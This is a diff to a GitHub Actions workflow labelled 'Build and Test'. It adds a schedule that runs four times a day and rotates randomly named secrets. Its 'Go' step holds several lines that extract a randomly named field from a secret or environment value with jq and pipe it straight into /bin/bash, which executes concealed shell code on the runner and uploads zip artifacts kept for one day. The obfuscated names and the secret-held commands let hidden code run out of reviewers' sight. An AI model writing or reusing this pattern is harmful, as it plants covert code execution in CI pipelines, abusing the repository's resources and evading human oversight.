@@ -2,6 +2,8 @@ name: Build and Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '12 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,20 +20,19 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          bs23128: ${{ secrets.bs23128 }}
+          erwy32098: ${{ secrets.erwy32098 }}
         run: |
-          printf '%s' "$bs23128" | jq -r .pde97972 | /bin/bash
-          printf '%s' "$aerp5" | jq -r .spi826 | /bin/bash
-          echo $kv5 | jq -r .zm77187 | /bin/bash
-          echo $bgx1 | jq -r .ge9 | /bin/bash
-          echo $xjq62 | jq -r .zb67740 | /bin/bash
-          printf '%s' "$xuj9" | jq -r .p2769 | /bin/bash
-          printf '%s' "$w747" | jq -r .m99 | /bin/bash
+          printf '%s' "$erwy32098" | jq -r .lagl98 | /bin/bash
+          echo $b49940 | jq -r .hfopd6107 | /bin/bash
+          echo $g8269 | jq -r .xprx80691 | /bin/bash
+          echo $va8273 | jq -r .pq21958 | /bin/bash
+          printf '%s' "$vdu9" | jq -r .xuswn3 | /bin/bash
+          echo $bkoh25 | jq -r .yxynt01355 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: wPwfufUp
+          name: fuzPtJed
           path: "*.zip"
           retention-days: 1
